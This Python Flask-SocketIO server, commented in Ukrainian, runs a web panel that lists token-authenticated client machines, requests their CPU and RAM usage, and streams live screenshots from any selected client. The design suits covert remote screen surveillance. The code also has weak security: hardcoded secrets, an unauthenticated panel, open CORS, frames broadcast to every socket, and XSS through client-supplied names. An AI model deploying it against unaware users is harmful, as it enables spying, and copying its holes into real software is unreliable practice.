import os
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'super_secret_flask_key_123'

# Токен повинен збігатися з SECRET_TOKEN у клієнта
SECRET_TOKEN = 'trololo_super_secret_key_999'

socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Збереження підключених клієнтів: { sid: { 'os': ..., 'node': ..., 'ip': ... } }
connected_clients = {}

@socketio.on('connect')
def handle_connect(auth):
    # Перевірка Bearer токена з заголовків
    auth_header = request.headers.get('Authorization')
    expected_header = f'Bearer {SECRET_TOKEN}'
    
    if auth_header != expected_header:
        print(f"[!] Спроба підключення з невірним токеном від {request.remote_addr}")
        return False  # Відхиляємо з'єднання
    
    print(f"[+] Клієнт підключився: {request.sid} ({request.remote_addr})")

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    if sid in connected_clients:
        node_name = connected_clients[sid].get('node', sid)
        print(f"[-] Клієнт від'єднався: {node_name}")
        del connected_clients[sid]
        emit('update_client_list', connected_clients, broadcast=True)

@socketio.on('register_client')
def handle_register(data):
    sid = request.sid
    connected_clients[sid] = {
        'os': data.get('os', 'Unknown'),
        'node': data.get('node', 'Unknown'),
        'ip': request.remote_addr
    }
    print(f"[*] Зареєстровано клієнт: {connected_clients[sid]['node']} ({connected_clients[sid]['os']})")
    emit('update_client_list', connected_clients, broadcast=True)

@socketio.on('sysinfo_response')
def handle_sysinfo(data):
    print(f"[*] Телеметрія від {request.sid}: CPU {data.get('cpu_percent')}%, RAM {data.get('ram_percent')}%")
    emit('sysinfo_data', {'sid': request.sid, 'info': data}, broadcast=True)

@socketio.on('screen_frame')
def handle_frame(data):
    # Пересилаємо кадр у веб-панель
    emit('render_frame', {'sid': request.sid, 'frame': data.get('frame')}, broadcast=True)

# --- КОМАНДИ З ВЕБ-ПАНЕЛІ ---

@socketio.on('cmd_start_stream')
def cmd_start_stream(target_sid):
    emit('start_stream', room=target_sid)

@socketio.on('cmd_stop_stream')
def cmd_stop_stream(target_sid):
    emit('stop_stream', room=target_sid)

@socketio.on('cmd_request_sysinfo')
def cmd_request_sysinfo(target_sid):
    emit('request_sysinfo', room=target_sid)

# --- ВЕБ-ІНТЕРФЕЙС КЕРУВАННЯ ---

HTML_DASHBOARD = """
<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <title>Панель керування</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
    <style>
        body { font-family: Arial, sans-serif; background: #181818; color: #eee; margin: 20px; }
        .card { background: #242424; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
        button { padding: 8px 12px; margin-right: 5px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 4px; }
        button:hover { background: #0056b3; }
        button.stop { background: #dc3545; }
        #stream-container { margin-top: 15px; text-align: center; }
        #stream-view { max-width: 100%; border: 2px solid #444; border-radius: 4px; }
        .status { font-weight: bold; color: #28a745; }
    </style>
</head>
<body>
    <h2>Панель керування клієнтами</h2>
    
    <div class="card">
        <h3>Підключені пристрої</h3>
        <div id="clients-list">Очікування підключень...</div>
    </div>

    <div class="card">
        <h3>Моніторинг і Стрім</h3>
        <div id="telemetry">Виберіть пристрій для запиту даних</div>
        <div id="stream-container">
            <img id="stream-view" src="" alt="Стрім вимкнено" />
        </div>
    </div>

    <script>
        const socket = io();

        socket.on('update_client_list', (clients) => {
            const container = document.getElementById('clients-list');
            container.innerHTML = '';
            
            if (Object.keys(clients).length === 0) {
                container.innerHTML = 'Немає активних клієнтів';
                return;
            }

            for (let sid in clients) {
                const c = clients[sid];
                const div = document.createElement('div');
                div.style.marginBottom = '10px';
                div.innerHTML = `
                    <span class="status">●</span> <strong>${c.node}</strong> (${c.os}) | IP: ${c.ip} 
                    <button onclick="startStream('${sid}')">Запустити стрім</button>
                    <button class="stop" onclick="stopStream('${sid}')">Зупинити стрім</button>
                    <button onclick="getSysinfo('${sid}')">Отримати інфо</button>
                `;
                container.appendChild(div);
            }
        });

        socket.on('render_frame', (data) => {
            document.getElementById('stream-view').src = 'data:image/jpeg;base64,' + data.frame;
        });

        socket.on('sysinfo_data', (data) => {
            document.getElementById('telemetry').innerText = 
                `Завантаження CPU: ${data.info.cpu_percent}% | Занято RAM: ${data.info.ram_percent}%`;
        });

        function startStream(sid) { socket.emit('cmd_start_stream', sid); }
        function stopStream(sid) { socket.emit('cmd_stop_stream', sid); }
        function getSysinfo(sid) { socket.emit('cmd_request_sysinfo', sid); }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_DASHBOARD)

if __name__ == '__main__':
    # Render передає порт через змінну оточення PORT
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port)
